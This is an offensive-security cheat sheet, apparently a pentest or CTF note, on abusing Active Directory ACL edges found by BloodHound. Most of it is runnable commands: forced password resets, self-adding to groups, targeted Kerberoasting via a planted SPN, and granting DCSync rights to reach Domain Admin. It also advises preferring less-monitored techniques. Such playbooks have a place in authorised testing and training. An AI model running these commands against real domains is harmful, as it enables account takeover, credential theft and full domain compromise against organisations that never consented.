# 🏰 AD ACL Abuse

> BloodHound edges like **GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember** are permissions one principal holds over another. Each is a concrete escalation: reset a password, add yourself to a group, or set up a targeted attack — often the middle links on the path to Domain Admin.

Part of [[Active Directory]]. Related: [[BloodHound]] · [[Kerberoasting]] · [[AD Lateral Movement]] · [[DCSync & Domain Dominance]]

---

## 🧠 THINK
- [[BloodHound]] tells you **which** ACL you hold over **which** object — this note is *how to abuse it*.
- Tooling: `bloodyAD`, `impacket-owneredit`/`dacledit`, `net rpc`, PowerView (on a Windows shell), `impacket-addcomputer`.
- Chain edges: control a group → add yourself → inherit its rights → next edge.

## 💥 ABUSE BY EDGE
**ForceChangePassword** (reset a user's password):
```bash
net rpc password "targetuser" "NewPass123!" -U "$DOMAIN"/"$U"%"$P" -S $DC
```
```bash
bloodyAD -u $U -p $P -d $DOMAIN --host $DC set password targetuser 'NewPass123!'
```
**AddMember / GenericWrite on a group** (add yourself → gain its rights):
```bash
bloodyAD -u $U -p $P -d $DOMAIN --host $DC add groupMember "Target Group" $U
```
```bash
net rpc group addmem "Target Group" "$U" -U "$DOMAIN"/"$U"%"$P" -S $DC
```
**GenericAll / GenericWrite over a user** → **targeted Kerberoast** (set an SPN, roast, reset):
```bash
# set SPN then roast (then clear it):
bloodyAD -u $U -p $P -d $DOMAIN --host $DC set object targetuser servicePrincipalName -v "fake/svc"
```
```bash
impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DC -request-user targetuser   # -> -m 13100 crack
```
**WriteDACL / WriteOwner** → grant yourself full rights, then DCSync or reset:
```bash
impacket-dacledit -action write -rights DCSync -principal $U -target-dn "DC=corp,DC=local" "$DOMAIN"/"$U":"$P"
```
→ then [[DCSync & Domain Dominance]].
**GenericAll over a computer** → RBCD (resource-based constrained delegation) with `impacket-addcomputer`/`rbcd.py` (advanced).

## 🔁 FOUND → NEXT
| EDGE (BloodHound) | ABUSE |
|---|---|
| ForceChangePassword | reset target pw → login as them |
| AddMember / GenericWrite (group) | add self → inherit group rights |
| GenericAll/Write (user) | targeted Kerberoast → [[Kerberoasting]] |
| WriteDACL / WriteOwner | grant DCSync → [[DCSync & Domain Dominance]] |
| GenericAll (computer) | RBCD → impersonate (advanced) |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Tool errors | try `bloodyAD` vs `net rpc` vs PowerView; check FQDN + clock |
| No abusable ACL from owned | mark more owned in BloodHound; local privesc → new principal → recollect |
| Reset breaks the account | note original; some accounts monitored — prefer group-add/roast |
| RBCD too complex under time | prefer simpler edges (reset/add-member/roast) |

## 📇 CHEAT SHEET
```bash
net rpc password "target" "NewPass123!" -U "$DOMAIN"/"$U"%"$P" -S $DC     # ForceChangePassword
```
```bash
bloodyAD -u $U -p $P -d $DOMAIN --host $DC add groupMember "Group" $U      # AddMember
```
```bash
impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DC -request-user target        # targeted Kerberoast
```
**Kill shot:** BloodHound edge → matching ACL abuse → new privileges → DA.
